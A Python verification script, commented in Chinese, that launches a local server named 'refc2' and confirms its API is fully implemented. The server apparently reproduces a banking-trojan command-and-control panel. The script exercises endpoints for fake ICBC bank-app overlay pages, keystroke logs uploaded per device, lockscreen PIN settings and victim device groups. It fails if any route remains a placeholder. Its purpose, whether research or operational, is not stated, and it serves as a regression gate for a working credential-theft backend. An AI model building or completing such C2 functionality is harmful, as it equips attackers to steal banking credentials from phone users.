#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""核对完整 API 面挂载：健康计数 / 契约占位路由 / 注入页模板 / 中继通道口径"""
import json, os, random, subprocess, sys, time, urllib.error, urllib.request

HOST, PORT = '127.0.0.1', 8801
BASE = 'http://%s:%d' % (HOST, PORT)
HERE = os.path.dirname(os.path.abspath(__file__))
USER, PASS = 'admin', 'verify-' + ''.join(random.choice('abcdef0123456789') for _ in range(6))


def call(path, method='GET', body=None, token=None):
    req = urllib.request.Request(BASE + path, data=json.dumps(body).encode() if body is not None else None,
                                 method=method,
                                 headers={'Content-Type': 'application/json'})
    if token:
        req.add_header('Authorization', 'Bearer ' + token)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read(200000).decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode('utf-8', 'replace')


def main():
    env = dict(os.environ, REFC2_USER=USER, REFC2_PASS=PASS)
    p = subprocess.Popen([sys.executable, os.path.join(HERE, 'server', 'refc2.py'),
                          '--host', HOST, '--port', str(PORT)],
                         stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
    try:
        for _ in range(40):
            try:
                st, body = call('/api/health')
                if st == 200:
                    print("[health] %s" % body)
                    break
            except Exception:
                time.sleep(0.25)
        tok = json.loads(call('/api/login', 'POST', {'username': USER, 'password': PASS})[1])['token']

        checks = [
            ('/api/health', 'GET', None, None),
            ('/api/inject-settings', 'GET', None, None),                 # 期望 401（鉴权门）
            ('/api/inject-settings', 'GET', None, tok),                  # 期望 501 contract_only
            ('/api/keylogs', 'GET', None, tok),
            ('/api/EaodBankInject.php?action=page&id=1', 'GET', None, None),  # 期望 200 而且是 ICBC 页
            ('/api/Captcha.php', 'GET', None, None),                     # 期望 200 带 base64 图
            ('/api/EaodLogin.php', 'POST', {'usrname': USER, 'password': 'wrong', 'captcha': 'abcd'}, None),
            ('/api/EaodLogin.php', 'POST', {'usrname': 'nosuchuser', 'password': 'x', 'captcha': 'abcd'}, None),
        ]
        for path, m, b, t in checks:
            st, body = call(path, m, b, t)
            print("  %-52s %-4s %s" % (path[:52], st, body[:110].replace('\n', ' ')))
        inj = call('/api/EaodBankInject.php?action=page&id=1')[1]
        print("\n注入页模板首行: %s" % inj.splitlines()[2][:90] if '<title>' in inj else '未取到')

        print("\n=== 功能流验证（真 handler，不是占位）===")
        st, b = call('/api/inject-settings/add', 'POST',
                     {'package_name': 'com.icbc', 'app_name': '中国工商银行',
                      'template_url': 'materials/inject/inject_id1_icbc.html',
                      'fullscreen': True, 'country': 'CN'}, tok)
        item = json.loads(b)
        print("  建注入配置        -> %s %s" % (st, item.get('item', {}).get('package_name')))
        iid = (item.get('item') or {}).get('id')

        st, b = call('/api/inject-settings', 'GET', None, tok)
        print("  列注入配置        -> %s 条数=%d" % (st, len(json.loads(b).get('items', []))))

        st, b = call('/api/inject-settings/html?id=%s' % iid, token=tok)
        ok_cfg = '"bank": "中国工商银行"' in b or '"bank":"中国工商银行"' in b
        print("  渲染注入页        -> %s 配置已注入=%s 长度=%d" % (st, ok_cfg, len(b)))

        st, b = call('/api/keylogs', 'POST', {'deviceId': 'refdev0000000001', 'pkg': 'com.icbc',
                                             'type': 'text', 'text': 'REF-KEYLOG-1'}, tok)
        print("  写键盘记录        -> %s %s" % (st, b[:60]))
        st, b = call('/api/keylogs?deviceId=refdev0000000001', 'GET', None, tok)
        rows = json.loads(b).get('list', [])
        print("  读键盘记录        -> %s 条数=%d 首条=%s" % (st, len(rows), rows[0]['text'] if rows else '-'))

        st, b = call('/api/lockscreen-auto-config', 'POST',
                     {'enabled': True, 'title': 'REF-LOCK', 'pin_length': 6}, tok)
        print("  锁屏配置          -> %s %s" % (st, b[:80]))
        st, b = call('/api/device-groups', 'PUT', {'name': 'REF-GROUP', 'color': '#333',
                                                   'deviceIds': ['refdev0000000001']}, tok)
        print("  建设备分组        -> %s %s" % (st, b[:80]))
        st, b = call('/api/audit_logs', 'GET', None, tok)
        print("  审计日志          -> %s 条数=%d" % (st, len(json.loads(b).get('list', []))))

        # 契约占位必须为 0（回归闸门：任何"登记了却没实现"的路由都会在这里暴露）
        st, b = call('/api/_surface', 'GET', None, tok)
        surf = json.loads(b) if st == 200 else {}
        ph = surf.get('placeholders') or []
        print("  契约面            -> 共 %s 条，占位 %d 条" % (surf.get('total'), len(ph)))
        if ph:
            for p in ph[:10]:
                print("     占位: %s %s" % (p.get('method'), p.get('path')))
            print("\n=== FAIL：存在契约占位（见上）===")
            return 1
        print("\n=== 服务端功能面验证完成 ===")
        return 0
    finally:
        p.terminate()


if __name__ == '__main__':
    sys.exit(main())
